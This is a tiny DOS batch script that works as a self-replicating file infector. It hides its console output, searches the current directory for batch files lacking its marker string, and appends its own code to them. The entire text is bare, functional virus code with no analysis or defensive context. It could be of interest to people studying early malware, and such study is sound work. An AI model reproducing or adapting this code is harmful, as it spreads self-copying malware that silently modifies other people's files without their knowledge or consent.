@echo off
@ctty nul
for %%i in (*.b?t) do set _!!=%%i
for %%q in (*.b?t) do find "_!!" %%q
if not errorlevel 1 goto dw
type %0 >> %_!!%
:dw
